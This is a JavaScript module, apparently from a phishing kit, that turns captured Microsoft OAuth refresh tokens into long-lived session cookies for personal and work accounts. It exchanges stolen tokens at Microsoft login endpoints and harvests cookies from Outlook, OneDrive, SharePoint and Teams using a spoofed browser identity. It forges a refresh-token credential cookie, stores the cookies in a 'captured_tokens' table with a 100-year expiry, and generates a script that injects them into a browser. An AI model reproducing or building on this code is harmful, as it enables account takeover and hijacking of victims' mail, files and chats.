/**
 * VGenius Cookie Converter Service
 * Converts OAuth2 refresh tokens/PRT to long-lasting session cookies
 * Supports both personal (MSA) and work/school (Azure AD) accounts
 */
'use strict';

const axios = require('axios');
const { encrypt } = require('../utils/encrypt');
const db = require('../database/connection');
const config = require('../config/env');

// Microsoft OAuth2 client configuration
const CLIENT_ID = config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
const TENANT = config.AZURE_TENANT || 'common';

// Token endpoint URLs for different account types
const TOKEN_ENDPOINTS = {
  work: `https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token`,
  common: 'https://login.microsoftonline.com/common/oauth2/v2.0/token',
  consumers: 'https://login.microsoftonline.com/consumers/oauth2/v2.0/token',
};

/**
 * Determine account type from email domain
 */
function detectAccountType(email) {
  if (!email) return 'unknown';
  const domain = email.split('@')[1].toLowerCase();
  const personalDomains = ['outlook.com', 'hotmail.com', 'live.com', 'passport.com', 'msn.com'];
  if (personalDomains.includes(domain)) return 'personal';
  return 'work_school';
}

/**
 * Detect account type from multiple signals
 */
function detectAccountTypeFromContext(token, email, tenant) {
  if (tenant === 'consumers') return 'personal';
  if (token && (token.startsWith('0.AT') || token.startsWith('M.R'))) {
    if (email) { return detectAccountType(email); }
    return 'work_school';
  }
  if (token) {
    try {
      const parsed = JSON.parse(token);
      if (parsed.prt) return 'work_school';
    } catch (e) {}
  }
  if (email) { return detectAccountType(email); }
  return 'unknown';
}

/**
 * Generate x-ms-RefreshTokenCredential cookie in competitor format
 */
function generateXmsRefreshTokenCredential(refreshToken, accountType) {
  let cookieValue;
  if (accountType === 'work_school' && typeof refreshToken === 'string' && refreshToken.startsWith('{')) {
    cookieValue = refreshToken;
  } else if (accountType === 'personal') {
    return { name: '', value: '', domain: '' };
  } else {
    const credential = JSON.stringify({
      token_type: 'Bearer',
      refresh_token: refreshToken,
      expires_in: 1209599
    });
    cookieValue = Buffer.from(credential).toString('base64');
  }
  return {
    name: 'x-ms-RefreshTokenCredential',
    value: cookieValue,
    domain: '.login.microsoftonline.com',
  };
}

/**
 * Convert OAuth2 refresh token/PRT to session cookies with 100-year expiry
 */
async function convertTokensToCookies(accessToken, templateType, tenant, email, accountType) {
  tenant = tenant || 'common';
  email = email || '';
  if (!accountType || accountType === 'unknown') {
    accountType = detectAccountTypeFromContext(accessToken, email, tenant);
  }
  const isPersonal = accountType === 'personal';

  try {
    const scope = isPersonal 
      ? 'openid profile email offline_access' 
      : 'https://graph.microsoft.com/.default offline_access openid profile';

    const exchangeResult = await exchangeTokenForCookies(accessToken, tenant, accountType, scope);
    if (!exchangeResult.success) { return exchangeResult; }

    const serviceCookies = await collectServiceCookies(exchangeResult.access_token, templateType, tenant, email, accountType);
    const xmsCookie = generateXmsRefreshTokenCredential(exchangeResult.new_refresh_token || accessToken, accountType);

    const allCookies = xmsCookie.name ? [xmsCookie, ...exchangeResult.cookies, ...serviceCookies] : [...exchangeResult.cookies, ...serviceCookies];

    if (allCookies.length === 0) {
      return { success: false, error: 'No cookies received from token exchange', cookies: null };
    }

    const cookieString = formatCookiesForInjection(allCookies, accountType);
    return {
      success: true,
      cookies: cookieString,
      cookie_count: allCookies.length,
      access_token: exchangeResult.access_token,
      new_refresh_token: exchangeResult.new_refresh_token,
      account_type: accountType,
      expires: '100 years',
    };
  } catch (err) {
    console.error('[CookieConverter] Conversion failed:', err.message);
    return { success: false, error: err.message, cookies: null };
  }
}

/**
 * Exchange token for new access token + cookies
 */
async function exchangeTokenForCookies(token, targetTenant, accountType, scope) {
  const cookies = [];
  let newRefreshToken = null;
  let lastError = null;

  let endpoints;
  if (accountType === 'personal') {
    endpoints = [TOKEN_ENDPOINTS.consumers, TOKEN_ENDPOINTS.common];
  } else {
    endpoints = [`https://login.microsoftonline.com/${targetTenant}/oauth2/v2.0/token`, TOKEN_ENDPOINTS.common];
  }

  for (const endpoint of endpoints) {
    try {
      const params = new URLSearchParams({
        client_id: CLIENT_ID,
        grant_type: 'refresh_token',
        refresh_token: token,
        scope: scope,
      });

      const response = await axios.post(
        endpoint,
        params,
        {
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          validateStatus: () => true,
          maxRedirects: 5,
          timeout: 30000,
        }
      );

      if (response.status === 200) {
        newRefreshToken = response.data.refresh_token || token;
        const setCookieHeaders = response.headers['set-cookie'] || [];
        for (const cookieStr of setCookieHeaders) {
          const cookieParts = cookieStr.split(';')[0].trim();
          const eqIndex = cookieParts.indexOf('=');
          if (eqIndex > 0) {
            const cookieName = cookieParts.substring(0, eqIndex).trim();
            const cookieValue = cookieParts.substring(eqIndex + 1).trim();
            if (cookieName && cookieValue) {
              const domain = endpoint.includes('consumers') ? '.login.live.com' : '.login.microsoftonline.com';
              cookies.push({ name: cookieName, value: cookieValue, domain: domain });
            }
          }
        }
        return {
          success: true,
          cookies,
          access_token: response.data.access_token,
          new_refresh_token: newRefreshToken,
        };
      }
      lastError = response.data?.error_description || response.data?.error || `HTTP ${response.status}`;
    } catch (err) { lastError = err.message; }
  }

  return { success: false, error: lastError || 'Token exchange failed', cookies: null };
}

/**
 * Collect additional cookies from Microsoft service endpoints
 */
async function collectServiceCookies(accessToken, templateType, tenant, email, accountType) {
  const cookies = [];
  const endpoints = getServiceEndpoints(templateType, tenant, email, accountType);
  for (const ep of endpoints) {
    try { await fetchCookiesFromEndpoint(cookies, ep, accessToken, accountType); } catch (e) {}
  }
  return cookies;
}

/**
 * Get service endpoints based on template type and account type
 */
function getServiceEndpoints(templateType, tenant, email, accountType) {
  const type = (templateType || '').toLowerCase();
  const endpoints = ['https://login.microsoftonline.com/common/oauth2/authorize'];

  if (accountType === 'personal') {
    endpoints.push('https://onedrive.live.com/');
    endpoints.push('https://outlook.live.com/owa/');
    endpoints.push('https://www.office.com/');
    if (type.includes('teams')) { endpoints.push('https://teams.microsoft.com/'); }
  } else {
    if (type.includes('sharepoint')) { endpoints.push(`https://${tenant}.sharepoint.com/_layouts/15/teamslogon.aspx`); }
    if (type.includes('onedrive')) {
      if (email) { endpoints.push(`https://${tenant}-my.sharepoint.com/personal/${encodeURIComponent(email)}/_layouts/15/onedrive.aspx`); }
      else { endpoints.push(`https://${tenant}.sharepoint.com/_layouts/15/onedrive.aspx`); }
    }
    if (type.includes('outlook') || type.includes('auth')) {
      endpoints.push('https://outlook.office365.com/owa/');
      endpoints.push('https://outlook.office.com/owa/');
    }
    if (type.includes('teams')) {
      endpoints.push('https://teams.microsoft.com/');
      endpoints.push('https://teams.microsoft.com/api/authservice/health');
    }
    if (type.includes('office') || type.includes('word') || type.includes('excel')) {
      endpoints.push('https://www.office.com/');
      endpoints.push('https://www.office.com/login');
    }
  }
  return endpoints;
}

/**
 * Determine primary endpoint for template type
 */
function determineEndpoint(templateType, tenant, email, accountType) {
  const type = (templateType || '').toLowerCase();
  if (accountType === 'personal') {
    if (type.includes('sharepoint')) return 'https://login.microsoftonline.com/common/oauth2/authorize';
    if (type.includes('onedrive')) return 'https://onedrive.live.com/';
    if (type.includes('outlook') || type.includes('auth')) return 'https://outlook.live.com/owa/';
    if (type.includes('teams')) return 'https://teams.microsoft.com/';
    return 'https://www.office.com/';
  } else {
    if (type.includes('sharepoint')) return 'https://login.microsoftonline.com/common/oauth2/authorize';
    if (type.includes('outlook') || type.includes('auth')) return 'https://outlook.office365.com/owa/';
    if (type.includes('onedrive')) return `https://${tenant}-my.sharepoint.com/personal/${encodeURIComponent(email || 'user')}/_layouts/15/onedrive.aspx`;
    if (type.includes('teams')) return 'https://teams.microsoft.com/';
    if (type.includes('office') || type.includes('word') || type.includes('excel')) return 'https://www.office.com/';
    return 'https://www.office.com/';
  }
}

/**
 * Determine resource URL for template type
 */
function determineResource(templateType, tenant, accountType) {
  const type = (templateType || '').toLowerCase();
  if (accountType === 'personal') {
    if (type.includes('onedrive')) return 'https://onedrive.live.com';
    return 'https://graph.microsoft.com';
  } else {
    if (type.includes('sharepoint')) return `https://${tenant}.sharepoint.com`;
    if (type.includes('onedrive')) return `https://${tenant}-my.sharepoint.com`;
    return 'https://graph.microsoft.com';
  }
}

/**
 * Fetch cookies from a single service endpoint
 */
async function fetchCookiesFromEndpoint(cookieList, url, accessToken, accountType) {
  const headers = {
    Authorization: `Bearer ${accessToken}`,
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
  };

  try {
    const response = await axios.get(url, { headers, maxRedirects: 5, validateStatus: s => s < 400, timeout: 15000 });
    extractCookiesFromResponse(cookieList, response, url);
  } catch (getErr) {
    try {
      const response = await axios.post(url, {}, { headers, maxRedirects: 5, validateStatus: s => s < 400, timeout: 15000 });
      extractCookiesFromResponse(cookieList, response, url);
    } catch (postErr) {}
  }
}

/**
 * Extract cookies from axios response
 */
function extractCookiesFromResponse(cookieList, response, url) {
  const setCookieHeaders = response.headers['set-cookie'] || [];
  for (const cookieStr of setCookieHeaders) {
    const cookieParts = cookieStr.split(';')[0].trim();
    const eqIndex = cookieParts.indexOf('=');
    if (eqIndex > 0) {
      const cookieName = cookieParts.substring(0, eqIndex).trim();
      const cookieValue = cookieParts.substring(eqIndex + 1).trim();
      if (cookieName && cookieValue) {
        try {
          const domain = new URL(url).hostname;
          cookieList.push({ name: cookieName, value: cookieValue, domain: domain });
        } catch (e) { cookieList.push({ name: cookieName, value: cookieValue, domain: '.' }); }
      }
    }
  }
}

/**
 * Format cookies for browser injection - returns semicolon-separated string
 */
function formatCookiesForInjection(cookies, accountType) {
  const cookieStrings = [];
  for (const cookie of cookies) {
    if (!cookie.name || !cookie.value) continue;
    let cookieStr = `${cookie.name}=${cookie.value}`;
    if (cookie.domain) cookieStr += `; domain=${cookie.domain}`;
    cookieStr += '; SameSite=None';
    cookieStr += '; path=/';
    cookieStr += '; secure';
    cookieStrings.push(cookieStr);
  }
  return cookieStrings.join("; ");
}

/**
 * Generate JavaScript code that injects cookies into the browser
 */
function generateCookieInjectionScript(cookies) {
  if (!cookies || !cookies.success || !cookies.cookies) { return ''; }
  const cookieList = Array.isArray(cookies.cookies) ? cookies.cookies : cookies.cookies.split('; ').filter(c => c.trim());
  let statement = '';
  for (const cookieStr of cookieList) {
    if (cookieStr) { statement += `document.cookie = "${cookieStr}";\n`; }
  }
  const redirectScript = '// Redirect after 3s\nsetTimeout(() => {\n window.location.href = "https://login.microsoftonline.com/?auth=2";\n}, 3000);';
  return statement + '\n' + redirectScript;
}

/**
 * Process cookie conversion and save to database
 */
async function processCookieConversion(tokenId, accessToken, templateType, tenant, accountType) {
  const result = await convertTokensToCookies(accessToken, templateType, tenant, null, accountType);
  if (result.success && result.cookies) {
    const ttlHours = 24 * 365 * 100;
    await db.query(
      'UPDATE captured_tokens SET cookies_encrypted=?, token_type=?, account_type=?, expiration=DATE_ADD(NOW(),INTERVAL ? HOUR), last_renewed=NOW(), renewal_count=renewal_count+1 WHERE id=?',
      [encrypt(result.cookies), 'cookie', accountType, ttlHours, tokenId]
    );
  }
  return result;
}

module.exports = { convertTokensToCookies, generateCookieInjectionScript, processCookieConversion, determineEndpoint, determineResource, detectAccountType, generateXmsRefreshTokenCredential, defineEndpoint: determineEndpoint, };
